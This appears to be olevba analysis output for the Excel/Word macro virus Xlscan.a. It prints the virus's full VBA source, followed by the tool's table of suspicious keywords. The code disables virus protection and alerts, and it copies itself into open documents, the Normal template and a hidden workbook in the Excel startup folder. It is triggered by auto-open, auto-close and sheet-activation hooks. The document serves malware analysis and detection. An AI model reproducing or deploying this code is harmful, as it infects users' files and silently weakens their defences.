olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Xlscan.a-96d262b1980206bd43bc02925b210b48363f089a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ЭтаКнига.cls 
in file: Virus.MSExcel.Xlscan.a-96d262b1980206bd43bc02925b210b48363f089a - OLE stream: '_VBA_PROJECT_CUR/VBA/ЭтаКнига'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: Virus.MSExcel.Xlscan.a-96d262b1980206bd43bc02925b210b48363f089a - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: Virus.MSExcel.Xlscan.a-96d262b1980206bd43bc02925b210b48363f089a - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: Virus.MSExcel.Xlscan.a-96d262b1980206bd43bc02925b210b48363f089a - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Xlscan.bas 
in file: Virus.MSExcel.Xlscan.a-96d262b1980206bd43bc02925b210b48363f089a - OLE stream: '_VBA_PROJECT_CUR/VBA/Xlscan'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Declare Function GetPrivateProfileStringA Lib "kernel32.dll" (ByVal lpSection As String, ByVal lpSetting As String, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Declare Function WritePrivateProfileStringA Lib "kernel32.dll" (ByVal lpSection As String, ByVal lpSetting As String, ByVal lpValue As String, ByVal lpFileName As String) As Long
Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Declare Function RegQueryValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, ByVal lpData As String, lpcbData As Long) As Long
Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Global Const REG_DWORD As Long = 4
Global Const REG_SZ As Long = 1
Global Const HKEY_CURRENT_USER As Long = &H80000001
Global Const HKEY_LOCAL_MACHINE As Long = &H80000002
Dim k As Long
Dim s As Long
Dim u As Long
Dim a As Long
Dim b As String

Sub Auto_Close()
On Error GoTo push_data
b = String(7, 0)
s = 256
v$ = String$(s, 0)

Application.ScreenUpdating = False
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayAlerts = wdAlertsNone
u = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\Microsoft\Office\8.0\Excel\Microsoft Excel", 0, KEY_ALL_ACCESS, k)
u = RegSetValueExA(k, "Options6", 0, REG_DWORD, Chr$(0), 4)
u = RegCloseKey(k)
ShowVisualBasicEditor = False
Open "c:\Windows\System\Xlscan.386" For Input As 1
Close 1
GoTo god

push_data:
Application.VBE.ActiveVBProject.VBComponents("Xlscan").Export "c:\Windows\System\Xlscan.386"

god:
On Error GoTo god_1
If ActiveDocument = "" Then GoTo god_3
With Options
.VirusProtection = False
.ConfirmConversions = False
.SaveNormalPrompt = False
End With
ActiveDocument.ReadOnlyRecommended = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(i).Name = "Xlscan" Then r = True
Next i
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Xlscan" Then e = True
Next i
If e = False Then
With ActiveDocument.VBProject
With .VBComponents.Import("c:\Windows\System\Xlscan.386")
End With
End With
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End If
If r = False Then
With NormalTemplate.VBProject
With .VBComponents.Import("c:\Windows\System\Xlscan.386")
End With
End With
End If
GoTo god_1

god_3:
If Dir(Application.StartupPath + "\Xlscan.xls") = "Xlscan.xls" Then p = True
For i = 1 To ActiveWorkbook.VBProject.VBComponents.Count
If ActiveWorkbook.VBProject.VBComponents(i).Name = "Xlscan" Then t = True
Next i
If t = False Then
With ActiveWorkbook.VBProject
With .VBComponents.Import("c:\Windows\System\Xlscan.386")
End With
End With
End If
If p = False Then
Workbooks.Add.SaveAs FileName:=Application.StartupPath + "\Xlscan.xls"
With ActiveWorkbook.VBProject
With .VBComponents.Import("c:\Windows\System\Xlscan.386")
End With
End With
ActiveWindow.Visible = False
Workbooks("Xlscan.xls").Save
c = WritePrivateProfileStringA("Booting_index", "Windows_system", ".False.", "c:\Windows\System\Xlscan.idx")
End If
a = GetPrivateProfileStringA("Booting_index", "Windows_system", "", b, 255, "c:\Windows\System\Xlscan.idx")
If b = ".False." Then GoTo god_1

god_1:
On Error GoTo toend
Application.ScreenUpdating = True
end_ = Str((Month(Now()))) + Str((Day(Now()))) + Str((Hour(Now()))) + Str((Minute(Now()))) + Str((Second(Now())))
For save_file = 1 To 10
  Application.VBE.ActiveVBProject.VBComponents("Xlscan").Export "c:\Windows\System\" + end_ + Str(save_file) + ".vcx"
Next save_file

toend:
End Sub
Sub AutoOpen()
 ShowVisualBasicEditor = False
End Sub
Sub AutoExit()
Call Auto_Close
End Sub
Sub ToolsMacro()
End Sub
Sub FileTemplates()
End Sub
Sub Auto_Open()
Application.OnSheetActivate = "Xlscan.Auto_Close"
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|RegQueryValueExA    |May read registry keys                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |kernel32.dll        |Executable file name                         |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+
